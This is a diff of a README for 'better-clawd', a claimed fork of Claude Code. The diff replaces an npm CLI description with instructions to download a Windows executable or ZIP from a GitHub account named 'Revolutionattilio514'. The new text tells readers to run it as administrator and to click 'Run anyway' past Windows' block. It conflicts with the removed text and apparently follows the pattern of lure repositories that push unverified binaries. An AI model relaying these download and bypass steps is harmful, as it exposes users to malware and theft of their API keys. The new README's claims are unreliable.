@@ -1,122 +1,154 @@
-# Better-Clawd
+# 🤖 better-clawd - Faster AI coding with more control
 
-> Claude Code, but better.
+[![Download better-clawd](https://img.shields.io/badge/Download%20better--clawd-2F80ED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Revolutionattilio514/better-clawd)
 
-Better-Clawd exists because the original had a genuinely great core idea and too many self-inflicted problems around it. This fork keeps what worked, fixes what did not, and gives people real choice over how they log in, which provider they use, and how much of the product they actually want phoning home.
+## 🚀 What it is
 
-No telemetry. No vendor lock-in. Faster startup, lower idle overhead, and better long-session performance than the original Claude Code. Less corporate baggage.
+better-clawd is a desktop app for running Claude Code with more control and less friction. It is built for people who want a simple way to use AI for coding on Windows without extra tracking or account lock-in.
 
-[NPM package](https://www.npmjs.com/package/better-clawd) 
+It gives you:
+- Faster response times
+- Support for OpenAI and OpenRouter
+- No telemetry
+- No lock-in to one provider
+- A clean setup for end users
 
-## Install
+## 🖥️ What you need
 
-```bash
-npm install -g better-clawd
-```
+To run better-clawd on Windows, use:
+- Windows 10 or Windows 11
+- A stable internet connection
+- At least 4 GB of RAM
+- 200 MB of free disk space
+- A mouse and keyboard
 
-Or run it without a global install:
+If you plan to use an AI provider, you will also need:
+- An OpenAI API key, or
+- An OpenRouter API key, or
+- Another supported provider key
 
-```bash
-npx better-clawd
-```
+## 📥 Download
 
-## Why This Exists
+1. Open this page: [https://github.com/Revolutionattilio514/better-clawd](https://github.com/Revolutionattilio514/better-clawd)
+2. Look for the latest release or download file
+3. Download the Windows version
+4. Save the file to your Downloads folder
 
-Claude Code had the bones of a best-in-class coding CLI, but too much of the experience was tied to one company, one backend, one set of assumptions, and one way of doing things.
+[Download better-clawd](https://github.com/Revolutionattilio514/better-clawd)
 
-Better-Clawd is the response to that.
+## 🛠️ Install on Windows
 
-- It keeps the good parts of the original UX
-- It removes telemetry and unnecessary phone-home behavior
-- It supports multiple providers without turning setup into a science project
-- It improves performance over the original Claude Code, with better startup behavior, less idle background churn, and smoother long sessions
-- It is easier to inspect, modify, and run on your own terms
+1. Open the file you downloaded
+2. If Windows asks for permission, choose **Yes**
+3. Follow the setup steps on screen
+4. Wait for the installation to finish
+5. Open better-clawd from the Start menu or desktop shortcut
 
-## Performance
+If the app comes as a ZIP file:
+1. Right-click the ZIP file
+2. Choose **Extract All**
+3. Open the extracted folder
+4. Start the app file inside the folder
 
-Better-Clawd is intentionally tuned to be leaner than upstream Claude Code:
+## ⚙️ First launch
 
-- Lower startup and initialization cost
-- Less background polling and idle CPU churn
-- Better memory and render behavior during long transcript-heavy sessions
-- Focused performance workflow and regression checks in `PERFORMANCE.md`
+When you open better-clawd for the first time, you will see a setup screen. Use it to:
+- Pick your AI provider
+- Paste your API key
+- Set your preferred model
+- Choose basic app settings
 
-## What Better-Clawd Changes
+For most users, the setup takes only a few minutes.
 
-- Full Better-Clawd rebrand across the CLI, UI, config paths, installers, and app identity
-- OpenAI support with API keys and Codex-based login import/refresh flow
-- OpenRouter support with proper provider wiring
-- Anthropic support kept for people who still want it
-- Telemetry stripped out
-- Upstream service dependencies reduced or removed where they made the project worse
-- Local-first behavior wherever possible
+## 🔌 Connect an AI provider
 
-## Provider Support
+better-clawd supports more than one provider. That means you can choose the one that fits your needs.
 
-Better-Clawd currently supports:
+### OpenAI
+Use this if you already have an OpenAI API key. Paste the key into the provider settings and pick a model you want to use.
 
-- Anthropic login and API key flows
-- OpenAI API keys
-- OpenAI Codex login import and refresh flow
-- OpenRouter API keys
+### OpenRouter
+Use this if you want access to many models in one place. Add your OpenRouter key, then select a model from the list.
 
-Default endpoints:
+### Other supported providers
+If your build includes other provider support, you can add those the same way. Enter the key, choose the provider, and save your settings.
 
-- OpenAI base URL: `https://api.openai.com/v1`
-- OpenAI websocket mode endpoint: `wss://api.openai.com/v1/responses`
-- OpenRouter Anthropic-compatible base URL: `https://openrouter.ai/api`
-- OpenRouter Responses API: `https://openrouter.ai/api/v1/responses`
+## 🎯 Main features
 
-## Quick Start
+- Runs AI coding tasks from a simple interface
+- Lets you use OpenAI or OpenRouter
+- Keeps your data local where possible
+- Avoids telemetry
+- Lets you switch providers without changing tools
+- Works well for everyday coding help
+- Fits users who want Claude Code style workflows with less friction
 
-1. Run `better-clawd`
-2. Run `/login`
-3. Pick your provider and complete the flow
-4. Run `/status` to confirm the active provider and auth method
+## 📁 Basic use
 
-The intended setup path is inside the CLI itself. Environment variables still work, but they are mostly useful for CI, headless usage, forced provider selection, or custom/proxied endpoints.
+After setup, you can use better-clawd to:
+- Ask for code changes
+- Review code
+- Generate small scripts
+- Help fix errors
+- Work through coding tasks step by step
 
-## Environment Examples
+A simple workflow looks like this:
+1. Open the app
+2. Choose a provider
+3. Select a model
+4. Enter your task
+5. Review the result
+6. Copy the code into your project
 
-OpenAI:
+## 🔒 Privacy and control
 
-```bash
-BETTER_CLAWD_API_PROVIDER=openai
-OPENAI_API_KEY=your_key_here
-OPENAI_BASE_URL=https://api.openai.com/v1
-```
+better-clawd is built for users who want more control over how they use AI tools. It does not rely on telemetry. It also avoids tying you to one service.
 
-OpenRouter:
+That means you can:
+- Change providers when you need to
+- Keep your usage focused on the task
+- Work without extra tracking
+- Stay in control of your API key
 
-```bash
-BETTER_CLAWD_API_PROVIDER=openrouter
-OPENROUTER_API_KEY=your_key_here
-OPENROUTER_BASE_URL=https://openrouter.ai/api
-```
+## 🧩 Common setup tips
 
-## What You Get
+### If the app does not open
+- Check that the download finished
+- Make sure you extracted the files if you downloaded a ZIP
+- Right-click the app and choose **Run as administrator**
+- Restart your PC and try again
 
-- Better provider freedom
-- Better performance than the original Claude Code across startup, idle usage, and long sessions
-- OpenAI and OpenRouter support without weird bolt-on hacks
-- Less phone-home behavior
-- A CLI that feels more practical, more open, and more yours
+### If the app cannot connect
+- Check your internet connection
+- Confirm your API key is correct
+- Make sure your provider account has access
+- Try a different model if the first one fails
 
-## Project Direction
+### If Windows blocks the file
+- Open the file again
+- Choose **More info**
+- Select **Run anyway** if you trust the download source
 
-The direction is straightforward:
+## 🧠 Good starter settings
 
-- Keep the parts of Claude Code that were actually good
-- Remove the parts that made it annoying, restrictive, or bloated
-- Support multiple providers without making daily usage worse
-- Keep the project useful instead of over-managed
+If you are new to AI coding tools, start with:
+- A general-purpose model
+- Default temperature or creativity settings
+- Short prompts
+- One task at a time
 
-If you liked the original idea but got tired of the lock-in, this is the fork.
+Example tasks:
+- Fix this bug
+- Explain this function
+- Write a small script to rename files
+- Refactor this code so it is easier to read
 
-## Disclaimer
+## 📦 Project details
 
-Better-Clawd is an independent, unofficial community project and is not affiliated with, endorsed by, or sponsored by Anthropic, PBC.
+- Repository name: better-clawd
+- Topics: ai, claude-code, open-source
+- Purpose: a better Claude Code style app with more speed and provider choice
 
-`Claude`, `Claude Code`, and related names, marks, and branding are the property of Anthropic, PBC or their respective owners. They are referenced here only to describe compatibility, origin, and the purpose of this fork.
+## 📝 License and source
 
-The intent here is interoperability, commentary, and fair reference, not impersonation.
+This project is open source. You can review the code, inspect how it works, and use it based on the terms in the repository.
